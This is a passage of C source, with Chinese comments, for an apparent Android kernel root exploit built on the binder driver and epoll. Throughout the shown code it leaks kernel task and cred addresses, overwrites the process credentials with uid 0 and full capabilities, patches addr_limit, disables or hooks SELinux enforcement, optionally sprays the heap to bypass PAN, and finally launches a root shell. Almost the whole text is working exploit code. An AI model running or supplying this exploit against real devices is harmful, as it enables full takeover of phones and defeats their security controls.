	pcred.cap_permitted.cap[0] = 0xffffffff;
	pcred.cap_permitted.cap[1] = 0xffffffff;
	pcred.cap_effective.cap[0] = 0xffffffff;
	pcred.cap_effective.cap[1] = 0xffffffff;
	pcred.cap_bset.cap[0] = 0xffffffff;
	pcred.cap_bset.cap[1] = 0xffffffff;
	pcred.cap_ambient.cap[0] = 0xffffffff;
	pcred.cap_ambient.cap[1] = 0xffffffff;


	if(addr_limit > KERNEL_ADDR_START && cred > KERNEL_ADDR_START){
		struct clobber_gdata gdata_addr_limit_cred[] = {
			{
				.dst = addr_limit,
				.src = (void*)&extra,
				.len = sizeof(extra),
			},
			{
				.dst = cred,
				.src = (void*)&pcred,
				.len = sizeof(pcred),
			},
		};
		ret = clobber_group_data_retry(binder_fd, epfd, gdata_addr_limit_cred, ARRAY_SIZE(gdata_addr_limit_cred));
	}
	else if(addr_limit > KERNEL_ADDR_START){
		struct clobber_gdata gdata_addr_limit[] = {
			{
				.dst = addr_limit,
				.src = (void*)&extra,
				.len = sizeof(extra),
			},
		};
		ret = clobber_group_data_retry(binder_fd, epfd, gdata_addr_limit, ARRAY_SIZE(gdata_addr_limit));
	}
	else if(cred > KERNEL_ADDR_START){
		struct clobber_gdata gdata_cred[] = {
			{
				.dst = cred,
				.src = (void*)&pcred,
				.len = sizeof(pcred),
			},
		};
		ret = clobber_group_data_retry(binder_fd, epfd, gdata_cred, ARRAY_SIZE(gdata_cred));
	}

	return ret;
}

/*
 * 函数: patch_addr_limit
 * 参数: addr_limit, addr_limit内核地址
 * 返回: 成功返回真，失败返回假
 * 说明: 利用漏洞修改 addr_limit
 */
int patch_addr_limit(int binder_fd, int epfd, unsigned long addr_limit)
{
	int ret = 0;

	if(addr_limit < KERNEL_ADDR_START){
		return ret;
	}

	unsigned long extra[] = {
		0xffffffffffffffff,
	};
	struct clobber_gdata gdata[] = {
		{
			.dst = addr_limit,
			.src = (void*)&extra,
			.len = sizeof(extra),
		},
	};

	ret = clobber_group_data_retry(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));

	return ret;
}

/*
 * 函数: patch_cred
 * 参数: cred, 当前进程cred内核地址
 * 返回: 成功返回真，失败返回假
 * 说明: 利用漏洞修改 cred
 */
int patch_cred(int binder_fd, int epfd, unsigned long cred)
{
	int ret = 0;

	if(cred < KERNEL_ADDR_START){
		return ret;
	}

	struct cred pcred;
#if 1
	pcred.usage.counter = 0x17;
	pcred.uid = 0;
	pcred.gid = 0;
	pcred.suid = 0;
	pcred.sgid = 0;
	pcred.euid = 0;
	pcred.egid = 0;
	pcred.fsuid = 0;
	pcred.fsgid = 0;
	pcred.securebits = 0;
	pcred.cap_inheritable.cap[0] = 0xffffffff;
	pcred.cap_inheritable.cap[1] = 0xffffffff;
	pcred.cap_permitted.cap[0] = 0xffffffff;
	pcred.cap_permitted.cap[1] = 0xffffffff;
	pcred.cap_effective.cap[0] = 0xffffffff;
	pcred.cap_effective.cap[1] = 0xffffffff;
	pcred.cap_bset.cap[0] = 0xffffffff;
	pcred.cap_bset.cap[1] = 0xffffffff;
	pcred.cap_ambient.cap[0] = 0xffffffff;
	pcred.cap_ambient.cap[1] = 0xffffffff;
#else
	pcred.usage.counter = 0x17;
	pcred.uid = 0x7d0;
	pcred.gid = 0x7d0;
	pcred.suid = 0x7d0;
	pcred.sgid = 0x7d0;
	pcred.euid = 0x7d0;
	pcred.egid = 0x7d0;
	pcred.fsuid = 0x7d0;
	pcred.fsgid = 0x7d0;
	pcred.securebits = 0;
	pcred.cap_inheritable.cap[0] = 0;
	pcred.cap_inheritable.cap[1] = 0;
	pcred.cap_permitted.cap[0] = 0;
	pcred.cap_permitted.cap[1] = 0;
	pcred.cap_effective.cap[0] = 0;
	pcred.cap_effective.cap[1] = 0;
	pcred.cap_bset.cap[0] = 0xc0;
	pcred.cap_bset.cap[1] = 0;
	pcred.cap_ambient.cap[0] = 0;
	pcred.cap_ambient.cap[1] = 0;
#endif

	struct clobber_gdata gdata[] = {
		{
			.dst = cred,
			.src = (void*)&pcred,
			.len = sizeof(pcred),
		},
	};
	ret = clobber_group_data_retry(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));

	return ret;
}

/* 准备工作，获取设备信息 */
int init(void)
{
	//get_kernel_version();

	dev_info = get_devinfo();
	printf("    设备信息：%s, 内核版本信息：%s\n", dev_info->devname, dev_info->kernver);

	if(dev_info->flag == DEVINFO_OFFSET_OK)
		printf("    已经获取了全部偏移参数，可以执行简化流程\n");
	else
		printf("    还未获取全部偏移参数，需要解析符号表\n");

	/* 根据wait字段偏移不同，成功利用漏洞，有两种不同的方式
	 * binder_thread.wait 字段对应 iovec.len 的情况
	 * binder_thread.wait 字段对应 iovec.base 的情况 */
	if(dev_info->offset_binder_wait % sizeof(struct iovec)){
		dev_info->clobber_group_data = clobber_group_data_corrlen;
		dev_info->leak_group_data = leak_data_corrlen;
		dev_info->leak_task = leak_task_corrlen;
	}
	else{
		dev_info->clobber_group_data = clobber_group_data_corrbase;
		dev_info->leak_group_data = leak_data_corrbase;
		dev_info->leak_task = leak_task_corrbase;
	}

#ifdef CONFIG_BYPASS_PAN
	spary_count = calc_mmap_count();
#endif

	return 0;
}

#ifdef CONFIG_EXPLOIT_ROOT
/* 利用漏洞本身读写内核 */
int main(void)
{
	int ret = -1;
	int binder_fd, epfd;
	struct leak_data data;
	int offset_cred = 0;
	int offset_selinux = 0;
	unsigned long selinux_enforcing = 0;
	int step = 0;
	int mmap_size = MMAP_SIZE;

	printf("[%d] Starting POC\n", step++);

	init();

	/* 申请一块内存，起始地址的低32位为0 */
	mmap_addr = mmap((void*)MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (mmap_addr != (void*)MMAP_ADDR){
		error("[ERROR] %s %d : mmap 4g aligned page failed!", __FUNCTION__, __LINE__);
		goto err_ret;
	}
	memset(mmap_addr, 0, MMAP_SIZE);

	binder_fd = open("/dev/binder", O_RDONLY);
	if(-1 == binder_fd){
		error("[ERROR] %s %d : open /dev/binder failed!", __FUNCTION__, __LINE__);
		goto err_open_binder;
	}

	epfd = epoll_create(1000);
	if(-1 == epfd){
		error("[ERROR] %s %d : epoll_create failed!", __FUNCTION__, __LINE__);
		goto err_epoll_create;
	}

	/* 1、泄露task内容 */
	if(leak_task_retry(binder_fd, epfd, &data)){
		printf("[%d] Leak kernel data OK!\n", step++);
		printf("    task_struct = 0x%lx\n", data.task);
		printf("    thread_info = 0x%lx\n", data.thread);
		printf("    stack       = 0x%lx\n", data.stack);
		printf("    cred        = 0x%lx\n", data.cred);
		printf("    kaddr       = 0x%lx\n", data.kaddr);
	}
	else{
		printf("[%d] Leak kernel data failed!\n", step++);
		goto err_exit;
	}

	/* 如果已经获取了全部参数，可以直接利用漏洞修改cred和selinux */
	if(dev_info->flag == DEVINFO_OFFSET_OK){
		if(!patch_cred_selinux(binder_fd, epfd, data.kaddr + dev_info->offset_selinux, data.cred)){
			printf("[%d] Patch cred and selinux failed!\n", step++);
			goto err_exit;
		}
		printf("[%d] Patch cred and selinux OK!\n", step++);
		goto end_ret;
	}
	else if(dev_info->flag == DEVINFO_OFFSET_SELINUX_OK){
		if(!patch_cred(binder_fd, epfd, data.cred)){
			printf("[%d] Patch cred failed!\n", step++);
			goto err_exit;
		}
		else{
			printf("[%d] Patch cred OK!\n", step++);
		}
		if(hook_selinux(binder_fd, epfd, data.kaddr + dev_info->security_hook_heads, DEVINFO_OFFSET_SELINUX_OK) > KERNEL_ADDR_START){
			printf("[%d] Hook selinux OK!\n", step++);
			goto end_ret;
		}
		else{
			printf("[%d] Hook selinux failed!\n", step++);
		}
	}

	munmap(mmap_addr, MMAP_SIZE);
	mmap_size = dev_info->kern_copy_size;

	/* 2、泄露内核数据，用来解析内核符号表 */
	if(!leak_kernel(binder_fd, epfd, data.kaddr + dev_info->kern_copy_offset)){
		printf("[%d] Leak kernel failed!\n", step++);
		goto err_exit;
	}
	printf("[%d] Leak kernel OK!\n", step++);

	/* 3、查找内核符号表 */
	if(!find_kallsyms(mmap_addr, dev_info->kern_copy_size)){
		printf("[%d] Find kernel symbol OK!\n", step++);
#if 0
		printf("    selinux_enforcing = 0x%lx\n", selinux_enforcing);
		printf("    _stext = 0x%lx\n", kallsyms_lookup_name("_stext"));
		printf("    init_task = 0x%lx\n", kallsyms_lookup_name("init_task"));
		printf("    fair_sched_class = 0x%lx\n", kallsyms_lookup_name("fair_sched_class"));
		printf("    rt_schedtune_timer = 0x%lx\n", kallsyms_lookup_name("rt_schedtune_timer"));
		printf("    root_task_group = 0x%lx\n", kallsyms_lookup_name("root_task_group"));
		printf("    dl_task_timer = 0x%lx\n", kallsyms_lookup_name("dl_task_timer"));
		printf("    do_no_restart_syscall = 0x%lx\n", kallsyms_lookup_name("do_no_restart_syscall"));
		printf("    init_nsproxy = 0x%lx\n", kallsyms_lookup_name("init_nsproxy"));
#endif
	}
	else{
		printf("[%d] Find kernel symbol failed!\n", step++);
		goto err_exit;
	}

	if(dev_info->flag == DEVINFO_OFFSET_SELINUX_NO){
		unsigned long security_hook_heads_address = hook_selinux(binder_fd, epfd, kallsyms_lookup_name("security_file_open"), DEVINFO_OFFSET_SELINUX_NO);
		//printf(">>> security_hook_heads address = 0x%lx, offset = 0x%lx\n", security_hook_heads_address, security_hook_heads_address - data.kaddr);
		if(security_hook_heads_address > KERNEL_ADDR_START){
			if(patch_cred(binder_fd, epfd, data.cred)){
				printf("[%d] Patch cred and selinux OK!\n", step++);
			}
			else{
				printf("[%d] Patch cred failed!\n", step++);
			}
			goto end_ret;
		}
		else{
			printf("[%d] Hook selinux failed!\n", step++);
			goto err_exit;
		}
	}

	//leak_code(binder_fd, epfd, kallsyms_lookup_name("security_file_open"));
	//leak_code(binder_fd, epfd, kallsyms_lookup_name("security_inode_alloc"));
	//leak_code(binder_fd, epfd, kallsyms_lookup_name("security_file_permission"));
	//leak_code(binder_fd, epfd, kallsyms_lookup_name("security_capable"));
	//leak_code(binder_fd, epfd, kallsyms_lookup_name("security_inode_permission"));

	/* 4、查找 selinux_enforcing 的内核地址 */
	printf("[%d] Find selinux_enforcing\n", step++);
	selinux_enforcing = find_selinux_enforcing(binder_fd, epfd);
	if(!selinux_enforcing){
		printf("	find selinux_enforcing failed!\n");
		goto err_exit;
	}
	printf("    selinux_enforcing = 0x%lx\n", selinux_enforcing);
	offset_selinux = selinux_enforcing - data.kaddr;
	printf("    offset_selinux = 0x%x\n", offset_selinux);
#if 0
	if(!patch_cred_selinux(binder_fd, epfd, selinux_enforcing, data.cred)){
		printf("[%d] Patch cred and selinux failed!\n", step++);
		goto err_exit;
	}
#else
	if(!patch_cred_selinux(binder_fd, epfd, selinux_enforcing, 0)){
		printf("[%d] Patch selinux_enforcing failed!\n", step++);
		goto err_exit;
	}
	if(!patch_cred_selinux(binder_fd, epfd, 0, data.cred)){
		printf("[%d] Patch cred failed!\n", step++);
		goto err_exit;
	}
#endif
	printf("[%d] Patch cred and selinux OK!\n", step++);

end_ret:
	if(0 == getuid()){
		printf("[%d] Get root!\n", step++);
		ret = 0;
	}
	system("/system/bin/sh");
	//while(1);
err_exit:
	close(epfd);
err_epoll_create:
	close(binder_fd);
err_open_binder:
	munmap(mmap_addr, mmap_size);
err_ret:
	return ret;
}

#else
/* patch addr_limit 之后读写内核 */
int main(void)
{
	int ret = -1;
	int binder_fd, epfd;
	struct leak_data data;
	int offset_cred = 0;
	int offset_selinux = 0;
	//char taskname[TASK_COMM_LEN];
	unsigned long selinux_enforcing = 0;
	unsigned char *p;
	int step = 0;
	int i, j, k, n;
	int mmap_size = MMAP_SIZE;

	printf("[%d] Starting POC\n", step++);

	init();

	/* 申请一块内存，起始地址的低32位为0 */
	mmap_addr = mmap((void*)MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (mmap_addr != (void*)MMAP_ADDR)
		error(">>> %s %d : mmap 4g aligned page failed!", __FUNCTION__, __LINE__);
	memset(mmap_addr, 0, MMAP_SIZE);

	binder_fd = open("/dev/binder", O_RDONLY);
	if(-1 == binder_fd)
		error(">>> %s %d : open /dev/binder failed!", __FUNCTION__, __LINE__);

	epfd = epoll_create(1000);
	if(-1 == epfd)
		error(">>> %s %d : epoll_create failed!", __FUNCTION__, __LINE__);

	/* 1、泄露task内容 */
	if(leak_task_retry(binder_fd, epfd, &data)){
		printf("[%d] Leak kernel data OK!\n", step++);
		printf("    task_struct = 0x%lx\n", data.task);
		printf("    thread_info = 0x%lx\n", data.thread);
		printf("    stack       = 0x%lx\n", data.stack);
		printf("    cred        = 0x%lx\n", data.cred);
		printf("    kaddr       = 0x%lx\n", data.kaddr);
	}
	else{
		printf("[%d] Leak kernel data failed!\n", step++);
		return -1;
	}

	/* 如果已经获取了全部参数，可以直接利用漏洞修改cred和selinux */
	if(dev_info->flag == DEVINFO_OFFSET_OK){
		if(!patch_cred_selinux(binder_fd, epfd, data.kaddr + dev_info->offset_selinux, data.cred)){
			printf("[%d] Patch cred and selinux failed!\n", step++);
			goto err_exit;
		}
		printf("[%d] Patch cred and selinux OK!\n", step++);
		goto end_ret;
	}
	/* 如果还未获取全部参数，需要读写内核解析内核符号表，修改addr_limit */
	if(dev_info->flag == DEVINFO_OFFSET_NO){
		//if(!patch_addr_limit_cred(binder_fd, epfd, data.thread + dev_info->offset_addr_limit, data.cred)){
		if(!patch_addr_limit(binder_fd, epfd, data.thread + dev_info->offset_addr_limit)){
			printf("[%d] Patch addr_limit and cred failed!\n", step++);
			goto err_exit;
		}
		printf("[%d] Patch addr_limit and cred OK!\n", step++);
	}

#ifdef CONFIG_BYPASS_PAN
	printf("[%d] Attempt to bypass the PAN!\n", step++);
	/*
	 * 想要绕过PAN的限制，就需要得到一块用户地址和内核地址映射到同一块物理页上的内存
	 * 用户地址和内核地址都是已知的，那么通过系统调用接口在内核态读写数据时使用内核地址
	 * 返回用户态再使用用户地址去读写数据，即可绕过PAN
	 */
	start_heap_spray();
	if(check_heap_spary(data.task + dev_info->offset_task_stack, data.stack)){
		printf("    Check heap spray failed!\n");
		goto err_exit;
	}
	else{
		printf("    Check heap spray OK!\n");
	}
#endif

	munmap(mmap_addr, MMAP_SIZE);
	mmap_size = dev_info->kern_copy_size;
	/* 2、泄露内核数据，用来解析内核符号表 */
	if(leak_kernel(binder_fd, epfd, data.kaddr + dev_info->kern_copy_offset)){
		printf("[%d] Leak kernel failed!\n", step++);
		goto err_exit;
	}
	printf("[%d] Leak kernel OK!\n", step++);

	/* 3、查找内核符号表 */
	if(!find_kallsyms(mmap_addr, dev_info->kern_copy_size)){
		printf("[%d] Find kernel symbol OK!\n", step++);
#if 0
		printf("    selinux_enforcing = 0x%lx\n", kallsyms_lookup_name("selinux_enforcing"));
		printf("    _stext = 0x%lx\n", kallsyms_lookup_name("_stext"));
		printf("    init_task = 0x%lx\n", kallsyms_lookup_name("init_task"));
		printf("    fair_sched_class = 0x%lx\n", kallsyms_lookup_name("fair_sched_class"));
		printf("    rt_schedtune_timer = 0x%lx\n", kallsyms_lookup_name("rt_schedtune_timer"));
		printf("    root_task_group = 0x%lx\n", kallsyms_lookup_name("root_task_group"));
		printf("    dl_task_timer = 0x%lx\n", kallsyms_lookup_name("dl_task_timer"));
		printf("    do_no_restart_syscall = 0x%lx\n", kallsyms_lookup_name("do_no_restart_syscall"));
		printf("    init_nsproxy = 0x%lx\n", kallsyms_lookup_name("init_nsproxy"));
#endif
	}
	else{
		printf("[%d] Find kernel symbol failed!\n", step++);
		goto err_exit;
	}

	/* 4、查找 selinux_enforcing 的内核地址 */
	printf("[%d] Find selinux_enforcing\n", step++);
	selinux_enforcing = find_selinux_enforcing(binder_fd, epfd);
	if(!selinux_enforcing){
		printf("    find selinux_enforcing failed!\n");
		goto err_exit;
	}
	printf("    selinux_enforcing = 0x%lx\n", selinux_enforcing);
	offset_selinux = selinux_enforcing - data.kaddr;
	printf("    offset_selinux = 0x%x\n", offset_selinux);
#if 0
	if(!patch_cred_selinux(binder_fd, epfd, selinux_enforcing, 0)){
		printf("[%d] Patch selinux_enforcing failed!\n", step++);
		goto err_exit;
	}
	printf("[%d] Patch selinux_enforcing OK!\n", step++);
	if(!patch_cred_selinux(binder_fd, epfd, 0, data.cred)){
		printf("[%d] Patch cred failed!\n", step++);
		goto err_exit;
	}
	printf("[%d] Patch cred OK!\n", step++);
#else
	if(!patch_cred_selinux(binder_fd, epfd, selinux_enforcing, data.cred)){
		printf("[%d] Patch addr_limit failed!\n", step++);
		return -1;
	}
	printf("[%d] Patch cred and selinux OK!\n", step++);
#endif
#if 0
	if(patch_selinux((void*)selinux_enforcing)){
		printf("[%d] Patch selinux failed!\n", step++);
		goto err;
	}
	printf("[%d] Patch selinux OK!\n", step++);
#endif

end_ret:
	if(0 == getuid()){
		printf("[%d] Get root!\n", step++);
		ret = 0;
	}
	system("/system/bin/sh");
	//while(1);
err_exit:
	close(epfd);
err_epoll_create:
	close(binder_fd);
err_open_binder:
	munmap(mmap_addr, mmap_size);
err_ret:
	return ret;
}
#endif
